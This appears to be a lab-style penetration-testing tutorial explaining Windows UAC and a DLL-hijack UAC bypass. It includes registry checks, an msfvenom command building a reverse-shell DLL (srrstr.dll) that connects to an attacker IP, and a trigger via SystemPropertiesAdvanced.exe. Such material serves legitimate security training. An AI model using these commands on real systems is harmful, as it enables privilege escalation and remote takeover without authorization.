## What UAC Actually Is

Think of UAC as a "are you sure?" gate, not a real security wall. Here's the key insight: even when your user account is in the local Administrators group, Windows doesn't run your processes with full admin rights by default. Instead you get a "split personality":

- A **standard user token** — used for everyday processes (this is what runs by default)
- A **full admin token** — only used when you explicitly elevate (right-click → "Run as administrator" and click "Yes" on the prompt)

If you land a shell as a user who's a local admin, but UAC is enabled, you're stuck running as a standard user. Commands that need admin rights will fail. Since there's no command-line way to click "Yes" on the GUI consent prompt, you need a way to trick an already-elevated, trusted process into doing your work for you — that's a "UAC bypass."

### Check if UAC is enabled

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
`0x1` = UAC is on.

### Check the UAC prompt level

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
`0x5` = "Always notify" (strictest, fewest working bypasses). Lower values = easier targets.

### Check Windows build (PowerShell)

```
[environment]::OSVersion.Version
```

### Check PATH for writable directories

```
cmd /c echo %PATH%
```

Look for any folder under your own user profile (like `WindowsApps`) — those are usually user-writable even though they're in PATH.

### Generate the malicious DLL (on attack box, with msfvenom)

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

### Trigger 

```
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

